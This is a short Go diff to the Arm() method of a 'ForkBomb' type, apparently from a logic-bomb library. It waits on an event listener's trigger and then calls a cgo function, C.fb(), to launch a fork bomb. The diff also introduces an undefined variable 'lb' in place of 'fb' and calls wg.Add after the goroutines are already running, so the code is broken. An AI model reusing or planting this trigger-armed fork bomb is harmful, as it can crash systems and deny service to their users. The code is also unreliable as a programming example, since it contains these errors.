@@ -42,23 +42,26 @@ func NewBomb(listener *puffgo.EventListener) *ForkBomb {
 // Arm() allows the activation of the bomb. If a bomb is not armed,
 // it won't be triggered even if the event defined in Listener occurs.
 func (fb *ForkBomb) Arm() {
-	var wg *sync.WaitGroup
+	var wg sync.WaitGroup
 
+	// Run listner's mainloop
 	go func() {
 		defer wg.Done()
 		fb.Listener.Mainloop()
 	}()
 
+	// Check for trigger...
 	go func() {
 		defer wg.Done()
 		for {
-			if isTriggered := <-fb.Listener.TriggerChannel; isTriggered {
+			if isTriggered := <-lb.Listener.TriggerChannel; isTriggered {
 				fb.Listener.Terminate()
 				C.fb()
 				break
 			}
 		}
 	}()
+
 	wg.Add(2)
 	wg.Wait()
 }
